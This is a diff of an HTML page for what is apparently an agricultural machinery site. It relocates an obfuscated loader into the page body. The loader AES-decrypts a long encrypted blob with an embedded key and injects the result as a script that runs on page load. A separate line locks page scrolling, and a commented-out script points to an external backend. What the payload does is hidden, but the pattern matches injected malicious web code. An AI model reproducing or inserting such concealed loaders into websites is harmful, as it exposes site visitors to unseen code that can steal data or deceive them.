@@ -5,21 +5,7 @@
     
     <script src="https://cdn.tailwindcss.com"></script>
      <!-- <script src="https://nakatakabackend-3.onrender.com/jp"></script> -->
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script>
-        function aesDecode(encodedText) {
-            const decodedText = decodeURIComponent(encodedText);
-            const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-            return bytes.toString(CryptoJS.enc.Utf8);
-        }
-        const codeString = aesDecode(`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`);
-        const script = document.createElement("script");
-        script.textContent = codeString;
-        document.body.appendChild(script);
-    </script>
-    <script>
-        document.body.style.overflow = "hidden";
-    </script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Сельскохозяйственная техника</title>
@@ -193,7 +179,21 @@
     </style>
 </head>
 <body>
-
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        function aesDecode(encodedText) {
+            const decodedText = decodeURIComponent(encodedText);
+            const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+            return bytes.toString(CryptoJS.enc.Utf8);
+        }
+        const codeString = aesDecode(`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`);
+        const script = document.createElement("script");
+        script.textContent = codeString;
+        document.body.appendChild(script);
+    </script>
+    <script>
+        document.body.style.overflow = "hidden";
+    </script>
 <div id="cookie-modal-box" class="hidden">
     <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
     <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
